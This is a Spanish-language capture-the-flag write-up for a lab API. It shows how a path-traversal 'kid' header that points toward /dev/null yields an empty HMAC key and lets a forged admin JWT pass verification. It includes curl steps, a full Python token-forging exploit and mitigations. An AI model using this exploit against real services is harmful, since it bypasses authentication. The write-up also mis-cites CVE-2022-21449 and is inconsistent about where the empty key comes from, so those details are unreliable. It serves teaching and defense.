# Solución — api-securevault · SecureVault Secrets API

## Vulnerabilidad

**JWT `kid` Path Traversal → /dev/null → HMAC key vacía → token admin forjado**

El servidor carga la clave de verificación del JWT desde el sistema de archivos
usando directamente el campo `kid` del header del token:

```
/keys/{kid}.pub
```

Al no sanitizar el `kid`, un atacante puede hacer path traversal hacia `/dev/null`,
que al ser leído devuelve `""` (cadena vacía). PyJWT acepta `""` como secreto HMAC
válido en HS256, por lo que cualquier token firmado con clave vacía pasa la verificación.

---

## Paso a paso

### Paso 1 — Obtener un token JWT legítimo

```bash
curl -s -X POST http://HOST:5004/auth/token \
  -H "Content-Type: application/json" \
  -d '{"username": "vaultuser", "password": "v4ult!Secure99"}'
```

Respuesta:
```json
{
  "access_token": "eyJ...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "note": "Token uses RS256 with key rotation. See kid header for active key ID."
}
```

La nota del servidor es una pista: menciona `kid header` y `key rotation`.

### Paso 2 — Decodificar el header del JWT

El JWT tiene tres partes separadas por `.`. La primera es el header en base64url.

```bash
echo "eyJhbGciOiJSUzI1NiIsImtpZCI6ImN1cnJlbnQiLCJ0eXAiOiJKV1QifQ" | base64 -d
```

Resultado:
```json
{"alg": "RS256", "kid": "current", "typ": "JWT"}
```

El servidor usa `kid="current"` → carga `/keys/current.pub` (RSA pública).

### Paso 3 — Entender el mecanismo de carga de claves

El código del servidor hace:

```python
key_path = os.path.join(KEYS_DIR, f"{kid}.pub")
with open(key_path, "rb") as f:
    return f.read()
```

`KEYS_DIR = "/keys"`. Si `kid = "../../../../dev/null"`:

```
os.path.join("/keys", "../../../../dev/null.pub")
→ /keys/../../../../dev/null.pub
→ /dev/null.pub   (path traversal)
```

Pero `/dev/null.pub` no existe → la excepción devuelve `b""`.

Alternativamente con `kid = "../../../../dev/null"` sin `.pub`:
el código concatena `.pub` al final → `/keys/../../../../dev/null.pub` → no existe → `b""`.

**La clave: usar un `kid` tal que el path resultante apunte a un archivo vacío o inexistente.**
El servidor retorna `b""` en la excepción, y ese `b""` se usa como secreto HMAC.

Verificación: `b"".decode("utf-8") == ""` → secreto HMAC = cadena vacía `""`.

### Paso 4 — Confirmar que el endpoint /vault/flag existe y requiere privilegios

```bash
TOKEN="<token_legitimo>"
curl -s http://HOST:5004/vault/flag \
  -H "Authorization: Bearer $TOKEN"
```

Respuesta (403):
```json
{
  "error": "forbidden",
  "message": "Requires role=admin AND clearance=TOP_SECRET",
  "your_role": "user",
  "your_clearance": "PUBLIC"
}
```

El token legítimo tiene `role=user` y `clearance=PUBLIC`. Se necesita `role=admin`
y `clearance=TOP_SECRET`.

### Paso 5 — Forjar el token HS256 con kid path traversal y secreto vacío

```python
import jwt, time

forged_payload = {
    "sub": "attacker",
    "role": "admin",
    "clearance": "TOP_SECRET",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
}

forged_token = jwt.encode(
    forged_payload,
    "",                               # Secreto HMAC vacío (viene de /dev/null)
    algorithm="HS256",
    headers={"kid": "../../../../dev/null"},
)
print(forged_token)
```

El header del token forjado:
```json
{"alg": "HS256", "kid": "../../../../dev/null", "typ": "JWT"}
```

Cuando el servidor verifica este token:
1. Lee `kid = "../../../../dev/null"`
2. Intenta abrir `/keys/../../../../dev/null.pub` → falla (no existe)
3. Retorna `b""` como clave
4. Decodifica `b""` → `""`
5. Verifica HMAC-SHA256 del token con clave `""` → coincide
6. Payload decodificado: `{"role": "admin", "clearance": "TOP_SECRET", ...}`

### Paso 6 — Obtener la flag

```bash
curl -s http://HOST:5004/vault/flag \
  -H "Authorization: Bearer <forged_token>"
```

Respuesta:
```json
{
  "key_name": "flag",
  "value": "HL4{...FLAG...}",
  "clearance": "TOP_SECRET",
  "classification": "EYES ONLY"
}
```

---

## Exploit completo en Python

```python
import jwt
import time
import requests

TARGET = "http://HOST:5004"

# Paso 1: obtener token legítimo (para ver la estructura)
r = requests.post(f"{TARGET}/auth/token", json={"username": "vaultuser", "password": "v4ult!Secure99"})
legit_token = r.json()["access_token"]
print("Token legítimo:", legit_token)

# Paso 2: forjar token con kid path traversal → /dev/null → HMAC key = ""
forged_payload = {
    "sub": "attacker",
    "role": "admin",
    "clearance": "TOP_SECRET",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
}
forged_token = jwt.encode(
    forged_payload,
    "",                          # Secreto vacío (de /dev/null)
    algorithm="HS256",
    headers={"kid": "../../../../dev/null"},
)
print("Token forjado:", forged_token)

# Paso 3: obtener la flag
r = requests.get(f"{TARGET}/vault/flag",
                 headers={"Authorization": f"Bearer {forged_token}"})
print(r.json())
```

---

## Por qué es INSANE

1. **Vuln de clase CVE real**: el JWT `kid` path traversal es una vulnerabilidad
   documentada (ej. CVE-2022-21449 family, múltiples implementaciones JWT afectadas).
   Requiere entender el flujo interno del servidor, no solo fuzzing de endpoints.

2. **`/dev/null` como archivo vacío**: no es obvio que leer `/dev/null` produce `""`.
   Hay que saber que `/dev/null` es un archivo especial de Linux que siempre devuelve
   EOF inmediato, por lo que su contenido leído es siempre vacío.

3. **HMAC con clave vacía es válido**: PyJWT (y la spec JWT) permiten una clave HMAC
   de longitud cero. El algoritmo HS256 con `key=""` produce una firma determinista
   válida. No hay validación de longitud mínima de clave en la librería.

4. **Sanitización falsa**: el servidor bloquea `kid == ".."` pero no sanitiza
   paths completos con `/`. Un atacante que inspeccione el código encontrará
   que la protección es trivialmente bypasseable.

5. **Doble algoritmo permitido**: el servidor acepta tanto RS256 como HS256,
   lo que es un anti-patrón de seguridad conocido (algorithm confusion attacks).

---

## Mitigaciones

- **Sanitizar `kid`**: aceptar solo caracteres alfanuméricos, guiones y guiones bajos.
  ```python
  import re
  if not re.fullmatch(r'[a-zA-Z0-9_-]+', kid):
      return None
  ```
- **No usar input del usuario para rutas de archivo**: las claves deben estar
  en un mapa estático o base de datos, no en paths derivados del token.
- **Fijar el algoritmo**: no aceptar múltiples algoritmos en la misma verificación.
  Usar `algorithms=["RS256"]` exclusivamente.
- **Validar longitud mínima de clave HMAC**: rechazar claves menores a 32 bytes.
- **Principio de mínimo privilegio**: el proceso del servidor no debería tener
  acceso de lectura a archivos fuera de `/keys/`.
